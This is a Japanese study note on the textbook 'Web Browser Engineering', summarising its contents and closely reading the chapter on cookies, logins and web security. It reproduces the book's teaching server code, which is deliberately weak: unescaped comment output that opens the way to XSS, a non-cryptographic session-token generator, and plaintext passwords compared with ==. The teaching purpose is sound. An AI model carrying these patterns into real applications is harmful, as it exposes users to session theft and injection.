# [06] Web Browser Engineering (browser.engineering) — 全体構成と第10章「Keeping Data Private」精読ノート

> ## ⚠ 教科書執筆者への最重要注意（第2次補完で判明）
>
> **本書の「本文（各章の文章）」は全権留保（All rights reserved）である。** リポジトリの `book/LICENSE` に「Chapter contents copyright 2018-2021 Pavel Panchekha & Chris Harrelson. All rights reserved.」と明記されている。一方、**コード**（`src/`, `infra/`, `www/`）はルートの `LICENSE` によるMIT型許諾で、著作権表示と許諾表示を添えれば再利用できる。
>
> **本ノートの前半（1〜12節）には、調査目的で原文が逐語で大量に引用されている。これを教科書にそのまま転載してはならない。** 教科書では必ず**自分の言葉で要約・再構成**し、出典として章URLを明記すること。引用は本当に必要な箇所だけ短く、引用と分かる形で。図版も転載せず、本ノート 2-A の記述を元に**自作の図**へ置き換えること。
>
> 詳細と実務指針は **本ノート末尾の「2-F. ライセンス」** を参照。
>
> ## 📌 第2次補完について
>
> 第1次ノートが末尾で「取得できていない」と記録した4項目（図版・Outline節・クイズ・ウィジェット）は、**本ノート末尾の「【第2次補完】」章ですべて解消または訂正済み**である。特に以下は**第1次ノートの記述に誤りがあった**ので、そちらではなく第2次補完の記述を採用すること。
>
> | 第1次ノートの記述 | 訂正内容 | 参照 |
> | --- | --- | --- |
> | 「サイトにはクイズが埋め込まれている」（読みどころ項目7） | **誤り。** 公開ビルドは `show_quiz: false` でクイズを出力しない。全16章で実在するクイズブロックは第5章の1個のみで、第10章には無い | 2-C |
> | 「ウィジェットで `SameSite=Lax` のクロスサイトPOST遮断を確認できる」（読みどころ項目3） | **誤り。** ウィジェットはサンドボックスによりクロスオリジンを作れない（`WidgetXHRError`）。ローカル実行が必要 | 2-D |
> | 「アニメーション図はソースからは読み取れない」（読みどころ項目2） | **不正確。** GIF実体は `www/im/` にコミット済みで内容を確認できた（動きのコマ送りのみ未確認） | 2-A |
> | 「Outline節の中身は取得できない」（読みどころ項目4） | **解消。** `infra/outlines.py` を実行して第10章分の実出力を取得した | 2-B |
> | 「Python 3.9.10 で動作確認」 | **要補正。** `book/porting.md` は Python 3.14 系、`requirements.txt` はさらに別のバージョンを固定しており、3記述が不一致 | 2-E |

## 取得状況

| URL | 状態 | 取得方法 | 備考 |
| --- | --- | --- | --- |
| https://browser.engineering/ | partial | (1) WebFetch → `EGRESS_BLOCKED` / (2) curl → `CONNECT tunnel failed, response 403` / (3) web.archive.org → 同じく403ブロック / (4) **成功: 公式ソースリポジトリを clone** `git clone --depth 1 https://github.com/browserengineering/book` | レンダリング済みHTMLページ自体は取得不可（エージェントプロキシが `browser.engineering:443` を `connect_rejected` で拒否）。ただし **このページを生成している原稿ファイル `book/index.md` を全文取得**したため、目次・本文の内容は逐語で確保できている。取得コミット: `c8c6d34b636a0fec3589a4a2e901916c774f1929`、ローカル展開先 `/home/user/browserengineering/book` |
| （同リポジトリ）`book/index.md` | full | ローカルclone | https://browser.engineering/ のトップページ（目次ページ）の原稿。`main: true` 指定のトップページ |
| （同リポジトリ）`book/security.md` | full | ローカルclone | 第10章 "Keeping Data Private"（= https://browser.engineering/security.html）全文1318行 |
| （同リポジトリ）`book/preface.md`, `book/intro.md`, `book/skipped.md`, `book/glossary.md`, `book/bibliography.md` | full | ローカルclone | 「ブラウザを自作して学ぶ」アプローチ、用語定義、割愛した話題 |
| （同リポジトリ）`book/embeds.md` | full | ローカルclone | 第15章。`Communicating Between Frames` / `Isolation and Timing` 節がクライアントサイドセキュリティに直結 |
| （同リポジトリ）`src/lab10.py`, `src/server10.py`, `src/runtime10.js`, `config.json`, `README.md` | full | ローカルclone | 第10章時点のブラウザ実装・サーバ実装・JSランタイムの完成形コード |

> 取得手順の記録（再現用、逐語）:
> ```
> curl -sSL --max-time 90 -A "Mozilla/5.0" "https://browser.engineering/"
> → curl: (56) CONNECT tunnel failed, response 403
> curl -sSL --max-time 60 -A "Mozilla/5.0" "https://raw.githubusercontent.com/browserengineering/book/main/README.md"
> → 成功（raw.githubusercontent.com は通る）
> GIT_LFS_SKIP_SMUDGE=1 git clone --depth 1 https://github.com/browserengineering/book /home/user/browserengineering/book
> → 成功
> ```

---

## 要約（3〜10行）

- *Web Browser Engineering*（著: **Pavel Panchekha & Chris Harrelson**）は、「**ブラウザは魔法ではなくコードである**」ことを示すために、**数千行のPython 3でネットワークからJavaScriptまで動く小さな実ブラウザを一から組み立てる**教科書。Oxford University Press から書籍版が出ており、日本語版はオライリー・ジャパン（`https://www.oreilly.co.jp/books/9784814401574/`）、韓国語版はHanbitから出版されている。
- 構成は「Introduction（3本）+ Part 1〜4（全16章）+ Conclusion + Appendix」。Part 1〜3で約1000行（演習込みで倍）、Part 4を含めた最終形で約3000行。各章末に演習があり、**章ごとに動くブラウザが残る**（`src/lab1.py` 〜 `src/lab16.py`）。
- クライアントサイド脆弱性ハンティングにとっての中核は **第10章 "Keeping Data Private"（`security.html`）**。Cookie → ログインシステム → Cookie実装 → クロスサイトリクエスト（`XMLHttpRequest`）→ **Same-origin policy** → **CSRF**（nonce）→ **SameSite Cookie** → **XSS**（エスケープ）→ **Content-Security-Policy** の順に、**攻撃と対策をブラウザ側・サーバ側の両方から実装して**説明する。
- 特徴的なのは「**能力の増加は必ず責任の増加を伴う（every increase in the capabilities of a web browser also leads to an increase in its responsibility to safeguard user data）**」という一貫した論理で、XHRという新機能を足した瞬間に同一オリジンポリシーが必要になる、という因果を**コードで**追体験させる点。
- 第15章 `Isolation and Timing` 節では、iframe間分離、**site isolation**、rasterizerの `seccomp` サンドボックス、**Spectre/Meltdown** とタイミング攻撃、`SharedArrayBuffer` と COOP/COEP相当ヘッダ要件まで扱う。
- 一方で著者は繰り返し「**この本はWebアプリケーションセキュリティの教科書ではない**」と警告しており（warningボックスが章頭と章末の2箇所）、TLSの詳細とプライバシーは意図的に割愛（`skipped.md`）している。

---

## 詳細ノート

### 1. 書籍の基本情報（出典: https://browser.engineering/ = `book/index.md`）

- **タイトル**: Web Browser Engineering
- **著者**: Pavel Panchekha & Chris Harrelson
- **トップページのリード文（逐語）**:
  > Web browsers are ubiquitous, but how do they work? This book explains, building a basic but complete web browser, from networking to JavaScript, in a couple thousand lines of Python.
- **書籍版の購入先（逐語のリンク先URL）**:
  - Bookshop: `https://bookshop.org/p/books/web-browser-engineering-chris-harrelson/21588966`
  - B&N: `https://www.barnesandnoble.com/w/web-browser-engineering-pavel-panchekha/1146050176`
  - Amazon: `https://amzn.to/4hFTkC2`
  - 韓国語版（Hanbit）: `https://www.hanbit.co.kr/store/books/look.php?p_code=B6818199506`
  - **日本語版（O'Reilly Japan）: `https://www.oreilly.co.jp/books/9784814401574/`**
  - 表紙画像のaltテキスト（逐語）: `The cover for Web Browser Engineering, from Oxford University Press` → 原書版元は **Oxford University Press**
- **更新情報のフォロー先（逐語）**:
  - blog: `https://browserbook.substack.com/archive`
  - twitter: `https://twitter.com/browserbook`
  - mastodon: `https://indieweb.social/@browserbook`
  - forum（GitHub Discussions）: `https://github.com/browserengineering/book/discussions`
  - 直接メール: `author@browser.engineering`
- **ソースコード**: `https://github.com/browserengineering/book`（Issueでの誤字報告を推奨。本文組み込みのフィードバックシステムは無効化済み）

### 2. 目次の完全再現（出典: `book/index.md` / `config.json`）

原文の目次は「Introduction」「Part 1: Loading Pages」「Part 2: Viewing Documents」「Part 3: Running Applications」「Part 4: Modern Browsers」「Conclusion」「Appendix」の7ブロック。各章タイトル直下の1行が章の扱うトピック（原文では `\` による強制改行で章タイトルにぶら下がる副題）。

#### Introduction（章番号なし）

| # | 章タイトル（原文） | 原稿ファイル | 公開URL |
| --- | --- | --- | --- |
| 1 | Preface | `preface.md` | https://browser.engineering/preface.html |
| 2 | Browsers and the Web | `intro.md` | https://browser.engineering/intro.html |
| 3 | History of the Web | `history.md` | https://browser.engineering/history.html |

#### Part 1: Loading Pages

| 章 | タイトル（原文） | 副題＝扱うトピック（原文逐語） | 原稿 | 実装ファイル |
| --- | --- | --- | --- | --- |
| 1 | Downloading Web Pages | URLs and HTTP requests | `http.md` | `lab1.py` |
| 2 | Drawing to the Screen | Creating windows and drawing to a canvas | `graphics.md` | `lab2.py` |
| 3 | Formatting Text | Word wrapping and line spacing | `text.md` | `lab3.py` |

#### Part 2: Viewing Documents

| 章 | タイトル（原文） | 副題＝扱うトピック（原文逐語） | 原稿 | 実装ファイル |
| --- | --- | --- | --- | --- |
| 4 | Constructing an HTML Tree | Parsing and fixing HTML | `html.md` | `lab4.py` |
| 5 | Laying Out Pages | Inline and block layout | `layout.md` | `lab5.py` |
| 6 | Applying Author Styles | Parsing and applying CSS | `styles.md` | `lab6.py` + `browser6.css` |
| 7 | Handling Buttons and Links | Hyperlinks and browser chrome | `chrome.md` | `lab7.py` |

#### Part 3: Running Applications

| 章 | タイトル（原文） | 副題＝扱うトピック（原文逐語） | 原稿 | 実装ファイル |
| --- | --- | --- | --- | --- |
| 8 | Sending Information to Servers | Form submission and web servers | `forms.md` | `lab8.py` + `server8.py` + `browser8.css` |
| 9 | Running Interactive Scripts | Changing the DOM and reacting to events | `scripts.md` | `lab9.py` + `server9.py` + `runtime9.js` + `comment9.js` + `comment9.css` |
| **10** | **Keeping Data Private** | **Cookies and logins, XSS and CSRF** | **`security.md`** | **`lab10.py` + `server10.py` + `runtime10.js`** |

#### Part 4: Modern Browsers

| 章 | タイトル（原文） | 副題＝扱うトピック（原文逐語） | 原稿 | 実装ファイル |
| --- | --- | --- | --- | --- |
| 11 | Adding Visual Effects | Blending, clipping, and compositing | `visual-effects.md` | `lab11.py` + `examples11.py` |
| 12 | Scheduling Tasks and Threads | The event loop and the rendering pipeline | `scheduling.md` | `lab12.py` + `server12.py` + `runtime12.js` + `eventloop12.js` |
| 13 | Animating and Compositing | Smooth animations using the GPU | `animations.md` | `lab13.py` + `runtime13.js` |
| 14 | Making Content Accessible | Keyboard input, zooming, and the accessibility tree | `accessibility.md` | `lab14.py` + `browser14.css` + `runtime14.js` |
| 15 | Supporting Embedded Content | Images, iframes, and scripting | `embeds.md` | `lab15.py` + `runtime15.js` + `browser15.css` |
| 16 | Reusing Previous Computation | Invalidation, editing, and correctness | `invalidation.md` | `lab16.py` |

> 〔本ノート筆者の観察（原典に基づく）〕目次ページでは第16章を "Reusing Previous Computation"（単数）と書いているが、`invalidation.md` の front matter の `title:` は `Reusing Previous Computations`（複数）。表記が2箇所で微妙に異なる。

#### Conclusion / Appendix

| 区分 | # | タイトル（原文） | 原稿 |
| --- | --- | --- | --- |
| Conclusion | 1 | What Wasn't Covered | `skipped.md` |
| Conclusion | 2 | A Changing Landscape | `change.md` |
| Appendix | 3 | Glossary | `glossary.md` |
| Appendix | 4 | Bibliography | `bibliography.md`（front matterの`title:`は `More Resources`） |
| Appendix | 5 | About the Authors | `about.md` |
| Appendix | 6 | Contributors | `/thanks`（動的ページ） |
| Appendix | 7 | List of courses taught from this book | `classes.md` |
| Appendix | 8 | One-page version | `onepage.md` → https://browser.engineering/onepage.html |

- **URL命名規則**: 原稿ファイル名 `<name>.md` が `https://browser.engineering/<name>.html` になる（Makefileの `www/%.html` ルール、および本文中の `http://browser.engineering/scripts.html#outline` というリンクから確認）。したがってセキュリティ章は **https://browser.engineering/security.html**、iframe章は **https://browser.engineering/embeds.html**。
- **章ごとのインタラクティブ版ブラウザ**: `https://browser.engineering/widgets/lab10-browser.html` のようなウィジェットが各章に用意されている（第10章本文に「Click [here](widgets/lab10-browser.html) to try this chapter's browser.」とある）。`lab2` 〜 `lab16` まで存在し、第8〜10章と第12章はサーバ側（`server8.js` / `server9.js` / `server10.js` / `server12.js`）もブラウザ内で動く。

#### 各章の冒頭アブストラクト（扱うトピックの原文要旨・抜粋）

| 章 | 冒頭アブストラクト（原文からの抜粋・要旨） |
| --- | --- |
| 1 http | A web browser displays information identified by a URL. And the first step is to use that URL to connect to and download information from a server somewhere on the internet.（URL解析・ソケット・TLS・HTTPリクエスト） |
| 2 graphics | ブラウザはページをダウンロードするだけでなく画面に表示しなければならない → グラフィカルUIを装備する |
| 3 text | 前章では文字グリッドを描いたが、英語は文字幅が異なり単語単位で折り返す必要がある → 折り返しと行間 |
| 4 html | これまでは開始タグ・終了タグ・テキストのストリームとして見ていた。HTMLは実際には木構造。CSS・JavaScript・視覚効果の基盤として**正式なHTMLパーサ**を追加 |
| 5 layout | ツリーベースのレイアウト（layout objectsのツリー）へ移行。背景・ボーダーの入れ子表現 |
| 6 styles | Cascading Style Sheets（CSS）のパースと適用。ブラウザ開発者側のデフォルトスタイルシートも含む |
| 7 chrome | ハイパーリンク、アドレスバー、ブラウザインターフェース（browser chrome）＝「どのページを見ているか」を決める部分 |
| 8 forms | 読み取り専用だったブラウザを**Webアプリケーションのプラットフォーム**に変える。HTMLフォームによるサーバへの情報送信 |
| 9 scripts | 2000年代初頭のJavaScript強化型Webアプリ。DukPyの導入、関数のエクスポート、ハンドルの返却とラップ、イベント処理、DOM変更、イベントのデフォルト動作 |
| **10 security** | **cookieによるユーザ識別を加えると、その cookie を盗もうとする敵から守る責任が生じる。ブラウザは cookie へのアクセス制御と誤用防止のための洗練された仕組みを持つ** |
| 11 visual-effects | blending / clipping / compositing。*surfaces* の制御。Skia グラフィックスライブラリへの移行 |
| 12 scheduling | 統一されたtask抽象、複数CPUスレッドへの分割、イベントループとレンダリングパイプライン |
| 13 animations | アニメーション、GPUアクセラレーション、compositing によるレンダリング作業の最小化 |
| 14 accessibility | ブラウザは *user* agent である。タッチ・キーボード・音声での操作、ズーム、アクセシビリティツリー |
| 15 embeds | 画像から他のWebページ（iframe）までの埋め込みコンテンツ。「Support for embedded content has powerful implications for browser architecture, performance, **security**, and open information access」 |
| 16 invalidation | レイアウトツリーをキャッシュとみなし変化した部分だけ再計算する invalidation 技術 |

### 3. 「ブラウザを自作して学ぶ」というアプローチ（出典: `preface.md` = https://browser.engineering/preface.html）

原文の主張を逐語に近い形で記録する。

- **動機**: 「計算機科学の学位課程には伝統的にOS・コンパイラ・データベースの講義があり、それらは謎をコードに置き換える（*replace mystery with code*）。Linux, Postgres, LLVM を『理解可能なコアアーキテクチャの改良・追加・最適化』に変える。その教訓は特定システムを超える: **どんなに巨大で複雑に見える計算機システムも、研究し理解できる**」。
- 「しかしWebブラウザはいまだに不透明（opaque）であり、学生だけでなく業界プログラマにも研究者にもそうだ。本書はモダンなWebブラウザの全主要コンポーネントを体系的に説明することでその謎を払う」。
- **規模と所要時間（逐語の数値）**:
  - Parts 1–3 で **約1000行**のコードのブラウザを構築。**演習をやると倍**。
  - 平均して1章あたり **4〜6時間**（数年のプログラミング経験者が読み・実装し・デバッグする時間）。
  - Part 4 は上級トピックで章が長くコードも多い。**最終的なブラウザは約3000行**。
- **設計原則**: 「あなたのブラウザは各ステップで『動く』し、各章は前章の上に積み上がる（Your browser will "work" at each step of the way, and every chapter will build upon the last.）」——これにより**複雑なソフトウェアを育て改善する練習**にもなる。このアイデアは J. R. Wilcox 由来で、さらに S. Zdancewic のコンパイラ講義に触発されている。
- **言語**: **Python 3**。コマンドラインでは `python3` を使う。依存は最小化しており他言語でも追える。ただし必要なライブラリは「TLS接続（Pythonは標準で持つ）、グラフィックス（本書はTk, Skia, SDLを使う）、JavaScript評価（本書は**DukPy**を使う）」。
- **「our browser」と「your browser」の使い分け**: 本書は読者が実際に作ることを前提とするが、各章のほぼ全コードを本文内にインライン展開している。概念上のブラウザ（著者と読者が共同で作ったもの）は "our browser"、読者の実装を指すときは "your browser"。
- **標準規格に対する姿勢（脆弱性ハンティング教科書として重要な自己制約、逐語）**:
  > This book's browser is irreverent toward standards: it handles only a sliver of the full HTML, CSS, and JavaScript languages, mishandles errors, and **isn't resilient to malicious inputs**. It is also quite slow. Despite that, its architecture matches that of real browsers, providing insight into those 10 million line of code behemoths.
  - つまり**この教材ブラウザは悪意ある入力に対して堅牢ではない**と明言されている。一方で**アーキテクチャは実ブラウザと一致**しており、1000万行級の巨大実装を理解する足がかりになる。
  - 「本書のブラウザが標準を簡略化・逸脱している箇所は明示的に注記した。エッジケースの挙動が分からなければ、**お気に入りの実ブラウザを起動して試せ**」。
- **実装の追試方法（README.md 逐語の手順）**:
  - 必要なもの: 最近の Python 3（**3.9.10** で動作確認、それより古くてもたぶん動く）、`tkinter`（`python3 -m tkinter` でテストウィンドウが開くか確認）、**第9章以降は `dukpy`**、**第11章以降は `skia` と `pysdl2`**。
  - 実行例（逐語）: `cd src/` → `python3 lab3.py https://browser.engineering`
  - 第8章以降のゲストブックWebアプリ（逐語）: `cd src/` → `python3 server8.py`。章ごとに `server8.py`, `server9.py`, ... がある。
  - ビルド: `make book draft blog` / テスト: `make test` / 静的チェック: `make lint`
  - リポジトリ構成: 本文Markdownは `book/`、HTML変換テンプレートとコードは `infra/`、章ごとのブラウザ実装は `src/`、サイトのスタイルは `www/`。
  - クイズJSは [mdbook-quiz](https://github.com/cognitive-engineering-lab/mdbook-quiz) 由来（`www/quiz-embed.iife.js`）。

### 4. ブラウザという対象の性質（出典: `intro.md` = https://browser.engineering/intro.html）

セキュリティ視点で引用価値の高い箇所のみ抽出。

- **Webの不変の構成要素（原文の箇条書き逐語）**:
  - The web is a _network of information_ linked by _hyperlinks_.
  - The user uses a _user agent_, called a _browser_, to navigate the web.
  - Information is requested with the _HyperText Transfer Protocol (HTTP)_ and structured with the _HTML document format_.
  - Documents are identified by Uniform Resource Locators (URLs), _not_ by their content, and may be dynamically generated.
  - Web pages can link to auxiliary assets in different formats, including images, videos, Cascading Style Sheets (CSS), and JavaScript.
  - All these building blocks are open, standardized, and free to use or reuse.
- **ブラウザに含まれるものの列挙（逐語）**:
  > a browser contains a rendering engine more complex and powerful than any computer game; a full networking stack; clever data structures and parallel programming techniques; a virtual machine, an interpreted language, and a just-in-time compiler; **a world-class security sandbox**; and a uniquely dynamic system for storing data.
- **ブラウザの役割（逐語）**: 「The browser is also the _implementer_ of the web: **its sandbox keeps web browsing safe**; its algorithms implement the declarative document model; its UI navigates links.」
- **inversion of control / constraint programming / declarative programming**: Webは制御を反転させ、仲介者（ブラウザ）がレンダリングの大部分を担う。開発者はパラメータと内容を指定するだけ。これらは宣言的であり、「変更は即座に適用される」ように見えるが、内部ではブラウザが**遅延（lazy）**して外部から観測可能になるまで適用を遅らせられる。
  - 〔クライアントサイド脆弱性ハンティングへの含意として原文が述べている点〕開発者はピクセルを直接描けない＝**何が起きるかはブラウザの実装に委ねられる**。この「実装に委ねられた領域」が挙動差・バグの温床になる。
- "hybrid" アプリ（アプリ内にブラウザを埋め込みUIの一部を描画する）が増えており、中国などでは "super-apps" が web-view ベースのゲームやウィジェットのブラウザとして振る舞う、という記述もある。

### 5. 【最重要】第10章 "Keeping Data Private" 詳細（出典: https://browser.engineering/security.html = `book/security.md`）

front matter: `title: Keeping Data Private` / `chapter: 10` / `prev: scripts` / `next: visual-effects`

#### 5.0 章の導入と警告ボックス

- 導入（逐語）:
  > Our browser has grown up and now runs (small) web applications. With one final step---user identity via cookies---it will be able to run all sorts of personalized online services. But capability demands responsibility: our browser must now secure cookies against adversaries interested in stealing them. Luckily, browsers have sophisticated systems for controlling access to cookies and preventing their misuse.
- **章頭のwarningボックス（逐語）**:
  > Web security is a vast topic, covering browser, network, and application security. It also involves educating the user, so that attackers can't mislead them into revealing their own secure data. This chapter can't cover all of that: if you're writing web applications or other security-sensitive code, **this book is not enough**.

#### 5.1 Cookies 節

- **問題設定**: ここまでの実装では、サーバは2つのHTTPリクエストが同じユーザから来たのか別のユーザから来たのか判別できない。ブラウザは事実上**匿名**。だからどこにも「ログイン」できない（ログイン済みユーザのリクエストが未ログインユーザのものと区別できないため）。
  - 脚注（逐語）: 「I don't mean anonymous against malicious attackers, who might use *browser fingerprinting* or similar techniques to tell users apart. I mean anonymous in the good-faith sense.」→ **ブラウザフィンガープリンティング**では区別できてしまう、という留保が明示されている。
- **cookieの定義（逐語）**:
  > A cookie---the name is meaningless, ignore it---is a little bit of information stored by your browser on behalf of a web server. The cookie distinguishes your browser from any other, and is sent with each web request so the server can distinguish which requests come from whom. In effect, **a cookie is a decentralized, server-granted identity for your browser**.
- **技術的な仕組み**: HTTPレスポンスは `Set-Cookie` ヘッダを含みうる。これはキー・値のペアを含む。ブラウザはこのペアを記憶し、**同じサーバへの次のリクエスト（cookieはサイト固有）** で `Cookie` ヘッダとしてエコーバックする。
- サーバは複数のcookieを設定できるし、有効期限などのパラメータも設定できるが、**この `Set-Cookie` / `Cookie` のやりとりが核心原理**（Figure 1: `im/security-cookies-2.gif`）。
- **トークン生成についての重要な脚注（逐語、教科書に必ず載せるべき）**:
  > This `random.random` call returns a decimal number with **53 bits of randomness**. That's not great; **256 bits is typically the goal**. And `random.random` is **not a secure random number generator**: by observing enough tokens you can predict future values and use those to hijack accounts. A real web application must use a **cryptographically secure random number generator** for tokens.
- **cookieに何を入れるべきかの脚注（逐語）**:
  > Browsers and servers both limit header lengths, so it's best to store minimal data in cookies. Plus, cookies are sent back and forth on every request, so long cookies mean a lot of useless traffic. It's therefore wise to **store user data on the server, and only store a pointer to that data in the cookie**. And, since cookies are stored by the browser, **they can be changed arbitrarily by the user, so it would be insecure to trust the cookie data**.
- **further ボックス（cookieという名前の由来、逐語のURL付き）**: cookieの[original specification][netscape-spec] は「no compelling reason」で "cookies" と呼んだと書いている。だがプログラム間で交換される不透明な識別子をこう呼ぶのは古く、Wikipediaは少なくとも1979年まで遡り、Webで使われる前に **X11** の認証で使われていた。
  - `netscape-spec`: `https://curl.se/rfc/cookie_spec.html`
  - `wiki-magic-cookie`: `https://en.wikipedia.org/wiki/Magic_cookie`
  - `x-cookie`: `https://en.wikipedia.org/wiki/X_Window_authorization#Cookie-based_access`

##### コード/コマンド（原文のまま逐語）

トークンの抽出または生成（サーバ側。リクエストヘッダのパース後、`do_request` の前に走る）:
``` {.python file=server}
import random

def handle_connection(conx):
    # ...
    if "cookie" in headers:
        token = headers["cookie"][len("token="):]
    else:
        token = str(random.random())[2:]
    # ...
```

新規訪問者に対する `Set-Cookie`（`do_request` が返った後、HTTPレスポンス組み立て時に走る）:
``` {.python file=server replace=%7b%7d/%7b%7d;%20SameSite%3dLax}
def handle_connection(conx):
    # ...
    if "cookie" not in headers:
        template = "Set-Cookie: token={}\r\n"
        response += template.format(token)
    # ...
```

サーバ側セッション:
``` {.python file=server}
SESSIONS = {}

def handle_connection(conx):
    # ...
    session = SESSIONS.setdefault(token, {})
    status, body = do_request(session, method, url, headers, body)
    # ...
```

``` {.python file=server}
def do_request(session, method, url, headers, body):
    if method == "GET" and url == "/":
        return "200 OK", show_comments(session)
    # ...
    elif method == "POST" and url == "/add":
        params = form_decode(body)
        add_entry(session, params)
        return "200 OK", show_comments(session)
    # ...
```

ヘッダの例（逐語）:
``` {.example}
Set-Cookie: foo=bar
```
``` {.example}
Cookie: foo=bar
```

#### 5.2 A Login System 節

ログインシステムの最小要件（逐語の箇条書き）:
- Users will log in with a username and password.
- The server will check if the login is valid.
- Users have to be logged in to add guest book entries.
- The server will display who added which guest book entry.

重要な設計判断（逐語）: 「Note that the session data (including the `user` key) is **stored on the server, so users can't modify it directly**. That's good, because we only want to set the `user` key in the session data if users supply the right password in the login form.」

##### 脆弱性に関する脚注（逐語、教科書に載せるべき）

- **タイミングサイドチャネル**:
  > Actually, using `==` to compare passwords like this is a bad idea: Python's equality function for strings scans the string from left to right, and exits as soon as it finds a difference. Therefore, you get a clue about the password from *how long* it takes to check a password guess; this is called a [timing side channel][timing-attack]. This book is about the browser, not the server, but a real web application has to do a [constant-time string comparison][constant-time]!
  - `timing-attack`: `https://en.wikipedia.org/wiki/Timing_attack`
  - `constant-time`: `https://www.chosenplaintext.ca/articles/beginners-guide-constant-time-cryptography.html`
- **このログインシステムに残る不備の列挙（逐語）**:
  > The insecurities include **not hashing passwords, not using [`bcrypt`][bcrypt], not allowing password changes, not having a "forget your password" flow, not forcing TLS, not sandboxing the server**, and many many others.
  - `bcrypt`: `https://auth0.com/blog/hashing-in-action-understanding-bcrypt/`
- **`type=password` について**: 「I've given the `password` input area the type `password`, which in a real browser will draw stars or dots instead of showing what you've entered, though our browser doesn't do that」。また「this is not particularly accessible HTML, lacking for example `<label>` elements around the form labels」。
- **further ボックス（他の認証方式、逐語）**:
  > A more obscure browser authentication system is [TLS client certificates][client-certs]. The user downloads a public/private key pair from the server, and the browser then uses them to prove who it is upon later requests to that server. Also, if you've ever seen a URL with `username:password@` before the hostname, that's [HTTP authentication][http-auth]. **Please don't use either method in new websites (without a good reason).**
  - `client-certs`: `https://aboutssl.org/ssl-tls-client-authentication-how-does-it-works/`
  - `http-auth`: `https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication`

##### コード/コマンド（原文のまま逐語）

``` {.python file=server}
LOGINS = {
    "crashoverride": "0cool",
    "cerealkiller": "emmanuel"
}
```

``` {.python file=server}
def do_request(session, method, url, headers, body):
    # ...
    elif method == "GET" and url == "/login":
        return "200 OK", login_form(session)
    # ...
```

``` {.python file=server}
def login_form(session):
    body = "<!doctype html>"
    body += "<form action=/ method=post>"
    body += "<p>Username: <input name=username></p>"
    body += "<p>Password: <input name=password type=password></p>"
    body += "<p><button>Log in</button></p>"
    body += "</form>"
    return body 
```

``` {.python file=server}
def do_request(session, method, url, headers, body):
    # ...
    elif method == "POST" and url == "/":
        params = form_decode(body)
        return do_login(session, params)
    # ...
```

``` {.python file=server}
def do_login(session, params):
    username = params.get("username")
    password = params.get("password")
    if username in LOGINS and LOGINS[username] == password:
        session["user"] = username
        return "200 OK", show_comments(session)
    else:
        out = "<!doctype html>"
        out += "<h1>Invalid password for {}</h1>".format(username)
        return "401 Unauthorized", out
```

``` {.python file=server}
def show_comments(session):
    # ...
    if "user" in session:
        out += "<h1>Hello, " + session["user"] + "</h1>"
        out += "<form action=add method=post>"
        out +=   "<p><input name=guest></p>"
        out +=   "<p><button>Sign the book!</button></p>"
        out += "</form>"
    else:
        out += "<a href=/login>Sign in to write in the guest book</a>"
    # ...
```

``` {.python file=server}
def add_entry(session, params):
    if "user" not in session: return
    if 'guest' in params and len(params['guest']) <= 100:
        ENTRIES.append((params['guest'], session["user"]))
```

``` {.python file=server}
ENTRIES = [
    ("No names. We are nameless!", "cerealkiller"),
    ("HACK THE PLANET!!!", "crashoverride"),
]
```

（プリロードされたコメントは1995年の映画 *Hackers* への参照。`Hack the Planet!` → `https://xkcd.com/1337`。ユーザ名 `crashoverride` / `cerealkiller` も同映画のハンドル名）

コメント出力部（この時点ではエスケープなし = 後述のXSSの起点）:
``` {.python file=server replace=+%20entry/+%20html.escape(entry),+%20who/+%20html.escape(who)}
def show_comments(session):
    # ...
    for entry, who in ENTRIES:
        out += "<p>" + entry + "\n"
        out += "<i>by " + who + "</i></p>"
    # ...
```

#### 5.3 Implementing Cookies 節（ブラウザ側）

- cookieを保存するデータ構造は伝統的に **cookie jar** と呼ばれる。
- **cookie jar はグローバルで、タブ単位ではない**（逐語）: 「Note that the cookie jar is global, not limited to a particular tab. That means that if you're logged in to a website and you open a second tab, you're logged in on that tab as well.」
- **サブリソースにもcookieが付く**という重要な脚注（逐語）:
  > Moreover, since `request` can be called multiple times on one page---to load CSS and JavaScript---later requests transmit cookies set by previous responses. For example our guest book sets a cookie when the browser first requests the page and then receives that cookie when our browser later requests the page's CSS file.
- **複数の `Set-Cookie` ヘッダ**（逐語）: 「A server can actually send multiple `Set-Cookie` headers to set multiple cookies in one request, though our browser won't handle that correctly.」→ **この教材実装の既知の制約**。
- 章の締め（逐語）: 「After all, **the cookie is the browser's identity, so if someone stole it, the server would think they are you**. We need to prevent that.」
- **further ボックス（RFC 2965 の失敗、逐語）**:
  > At one point, an attempt was made to "clean up" the cookie specification in [RFC 2965][rfc-2965], including human-readable cookie descriptions and cookies restricted to certain ports. This required introducing the `Cookie2` and `Set-Cookie2` headers; the new headers were not popular. They are now [obsolete][rfc-6265].
  - `rfc-2965`: `https://datatracker.ietf.org/doc/html/rfc2965`
  - `rfc-6265`: `https://datatracker.ietf.org/doc/html/rfc6265`

##### コード/コマンド（原文のまま逐語）

``` {.python}
COOKIE_JAR = {}
```

``` {.python replace=(self/(self%2c%20referrer,cookie%20%3d/cookie%2c%20params%20%3d}
class URL:
    def request(self, payload=None):
        # ...
        if self.host in COOKIE_JAR:
            cookie = COOKIE_JAR[self.host]
            request += "Cookie: {}\r\n".format(cookie)
        # ...
```

``` {.python replace=(self/(self%2c%20referrer,%3d%20cookie/%3d%20(cookie%2c%20params)}
class URL:
    def request(self, payload=None):
        # ...
        if "set-cookie" in response_headers:
            cookie = response_headers["set-cookie"]
            COOKIE_JAR[self.host] = cookie
        # ...
```

> **重要**: cookie jar のキーは `self.host` のみ。**scheme も port も含まない**。これは後述の同一オリジンポリシーの origin 定義（scheme + host + port）と意図的に異なる。

#### 5.4 Cross-site Requests 節（`XMLHttpRequest` の導入）

- 前提（逐語）: 「Cookies are site-specific, so one server shouldn't be sent another server's cookies. But if an attacker is clever, they might be able to get *the server* or *the browser* to help them steal cookie values.」
- **ネットワーク層の脅威を列挙した脚注（逐語、教科書に載せる価値が高い）**:
  > Well... Our connection isn't encrypted, so an attacker could read it from an open Wi-Fi connection. But another *server* couldn't. Or how about this attack: another server could **hijack our DNS** and redirect our hostname to a different IP address, and then steal our cookies. Some internet service providers support **DNSSEC**, which prevents this, but not all. Or consider this attack: a state-level attacker could announce fradulent **BGP (Border Gateway Protocol)** routes, which would send even a correctly retrieved IP address to the wrong physical computer. (Security is very hard.)
- 「The easiest way for an attacker to steal your private data is **to ask for it**.」ブラウザには他サイトのcookieを要求するAPIはない。しかし**他サイトへリクエストを送るAPIはある**。それが `XMLHttpRequest`。
